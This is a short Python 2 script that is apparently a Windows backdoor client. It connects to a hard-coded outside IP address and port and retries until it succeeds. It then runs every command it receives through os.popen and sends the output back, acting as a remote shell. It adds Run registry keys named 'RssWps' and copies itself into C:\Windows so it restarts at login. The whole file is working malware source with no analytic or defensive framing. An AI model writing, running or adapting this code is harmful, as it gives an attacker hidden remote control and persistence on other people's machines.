#-*- coding: utf-8 -*
import socket
import time
import os

class Client:
    def __init__(self,ip,port):
        self.addr = ip,port
        print "Init Successfully..."

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect(self.addr)
                print "Connect Successfully..."
                break
            except Exception as e:
                self.sock.close()
                print "Sleeping:",e
                time.sleep(5)


    def start(self):
        cmd = self.sock.recv(1024)
        print cmd
        try:
            proc = os.popen(cmd)
            output = proc.read()

            print output + '--end--'
            self.sock.send(output + '--end--')

        except Exception as e:
            print e

    def register(self):
        try:
            cmd = r"""echo YES |reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d C:\Windows\client.exe" """
            print os.popen(cmd).read()
        except Exception as e:
            print e
        try:
            cmd = r"""echo YES |reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d "C:\Windows\client.exe" """
            print os.popen(cmd).read()
        except Exception as e:
            print e
        try:
            cmd = r"""echo YES |xcopy /h /f "%cd%\client.exe" "C:\Windows" """
            print os.popen(cmd).read()
        except Exception as e:
            print e


def main():
    cc = Client('120.78.136.136',12314)
    cc.register()
    cc.connect()
    while True:
        try:
            cc.start()
        except:
            cc.connect()

if __name__ == '__main__':
    main()

